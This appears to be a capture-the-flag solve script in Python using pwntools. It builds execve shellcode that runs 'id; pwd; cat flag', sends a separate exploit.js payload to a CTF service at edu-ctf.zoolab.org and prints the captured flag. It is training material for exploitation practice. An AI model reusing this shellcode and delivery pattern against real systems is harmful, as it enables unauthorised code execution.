from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30219

context.arch = 'amd64'
cmd = 'id; pwd; cat flag'
shellcode = asm(''.join([
    shellcraft.execve('/bin/sh', ['/bin/sh', '-c', cmd], []),
    shellcraft.exit(0),
]))
sc = str(list(shellcode))
# print(sc)

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process('./run.sh')

exploit = open('./exploit.js', 'rb').read()
# exploit = exploit.replace(b'{sc}', sc)

io.sendlineafter(b'>', str(len(exploit)).encode())
io.send(exploit)

# io.interactive()

info(io.readline().decode().strip())
info(io.readline().decode().strip())
flag = io.readuntil(b'}').strip().decode()
success(flag)

